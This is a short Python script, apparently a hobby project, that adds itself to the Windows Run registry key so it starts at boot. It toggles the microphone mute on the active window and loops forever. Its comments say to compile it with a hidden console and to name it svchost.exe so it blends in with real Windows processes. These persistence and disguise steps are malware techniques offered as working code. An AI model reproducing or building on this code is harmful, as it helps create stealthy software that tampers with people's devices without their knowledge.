import win32api
import win32gui
import pywintypes
import os
from datetime import datetime
import _winreg as reg

# First: inject the program in the run windows registry, so it runs at boot
# Second: create the program that takes control over the mic
# Third: create the program .exe and make it run in background
# Fourth: make it run permanently

# First task

# HKEY_CURRENT_USER contains the run folder
# create a registry key
key = reg.HKEY_CURRENT_USER

# make the run folder as the key value (Software\Microsoft\Windows\CurrentVersion\Run)
key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

# open the key to make changes to
open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

# set up the .exe path
Username = os.environ['USERNAME']
address = '"C:\Users\\'+Username+'\AppData\Roaming\svchost.exe"'

# modifiy the open key and add the .exe path to it
reg.SetValueEx(open_key, "mic_control", 0, reg.REG_EXPAND_SZ, address)


# Second task

# notifies the active window
WM_APPCOMMAND = 0x319

# Mute/demute microphone
APPCOMMAND_MICROPHONE_VOLUME_MUTE = 0x180000

# Toggle microphone.
APPCOMMAND_MIC_ON_OFF_TOGGLE = 0x2C0000
# Increase microphone volume by (+2).

APPCOMMAND_MICROPHONE_VOLUME_UP = 0x1A0000

# Decrease microphone volume by (-2).
APPCOMMAND_MICROPHONE_VOLUME_DOWN = 0x190000

# get the active window
hwnd_active = win32gui.GetForegroundWindow()

# use it to create an event and take cantrol over the mic
# we chose the mute/demute option
win32api.SendMessage(hwnd_active, WM_APPCOMMAND, None,
                     APPCOMMAND_MICROPHONE_VOLUME_MUTE)

# Third task :
# create a .exe file via pyinstaller
# chose the --noconsole option to hide the console while the executable is running
# name it svchost just like the other legitimate hidden windows processes so it can run in background


# Fourth task
while True:
    pass
